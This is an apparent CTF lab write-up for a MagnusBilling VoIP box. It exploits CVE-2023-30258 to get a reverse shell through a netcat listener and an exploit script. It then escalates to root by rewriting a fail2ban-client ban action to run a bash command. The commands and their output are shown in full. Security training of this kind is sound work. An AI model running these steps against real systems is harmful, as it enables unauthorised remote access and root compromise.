## What is user.txt ?

We start off by an nmap scan :

It appears that there is an accessible web application on port `80`.

Connecting on it using Firefox, we find a login form for **MagnusBilling** which is a **VOIP billing** application :

![1](/assets/img/tryhackme/ctf/billing/1.png)

As we know from the challenge’s description, it’s useless to simply try a bruteforce on this login form. So we need to find more information to have login accesses.

By searching a bit the Internet, it appears that there is an **Unauthenticated RCE vulnerability** named as **CVE-2023-30258**.

On the MagnusBilling application 6.x and 7.x, we can run arbitrary commands via unauthenticated HTTP request. A piece of demonstration code is present in `lib/icepay/icepay.php`, with a call to an `exec()` which includes the **GET** parameter `“democ”`, which is not properly sanitised. So, after successful exploitation, we can arbitrarily run **OS commands**.

Also, I found a [github](https://github.com/hadrian3689/magnus_billing_rce/blob/main/README.md) posting a python code for the exploit which I decided to use for this challenge.

So I first start a listener using **netcat** :

```shell
$ nc -lvnp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
```

And then send the payload using the python script :

```shell
$ python3 magnusrce.py -t http://10.10.119.32/mbilling/ -lh 10.14.83.7 -lp 1337
CVE-2023-30258 Magnus Billing - Command Injection Vulnerability
Sending payload...
```

Then, right after, we get a connection back to our listener.

```shell
$ nc -lvnp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.119.32.
Ncat: Connection from 10.10.119.32:34044.
bash: cannot set terminal process group (680): Inappropriate ioctl for device
bash: no job control in this shell
asterisk@Billing:/var/www/html/mbilling/lib/icepay$
```

And as the vulnerability’s description suggested, we get a shell under the `asterisk` user.

So, we first [upgrade our shell](https://0xffsec.com/handbook/shells/full-tty/) to an interactive one for easier navigation.

After that, we can access the `/home` folder where we will find the directory of a user called **magnus**, with in it the **first flag**.

```shell
asterisk@Billing:/var/www/html/mbilling/lib/icepay$ cd /home/magnus
asterisk@Billing:/home/magnus$ ls
Desktop    Downloads  Pictures  Templates  user.txt
Documents  Music      Public    Videos
asterisk@Billing:/home/magnus$ cat user.txt
THM{[REDACTED]}
```

## What is root.txt ?

We can enumerate the SUID/GUID files as well as any possible files that could help us to escalate our privileges, but this doesn’t show anything useful.

However, we can enumerate the sudo commands of our user using sudo -l, and see that we can NOPASSWD root rights on the fail2ban-client :

```shell
asterisk@Billing:/home/magnus$ sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

Can we do it anything with it ? Yes ! Because we can configure fail2ban and, as root, incite fail2ban to perform malicious action/execute commands.

First, we can restart Fail2ban to refresh the service.

```shell
asterisk@Billing:/home/magnus$ sudo /usr/bin/fail2ban-client restart
Shutdown successful
Server ready
```

Then, we can use the set parameter of the fail2ban-client command to replace an action that exists with another one, that would allow us to read the `root.txt` file, by copying it.

```shell
# This way, we will trigger a rule that will copy the /root/root.txt file to /tmp and change its permissions to read it
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'"
```

In order to trigger the rule, we need to ban an IP.

```shell
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
```

Now, we can check if the rule was successfully executed, and it is, so we recover the **last flag** :

```shell
asterisk@Billing:/home/magnus$ ls /tmp
root.txt
asterisk@Billing:/home/magnus$ cat /tmp/root.txt
THM{[REDACTED]}
```
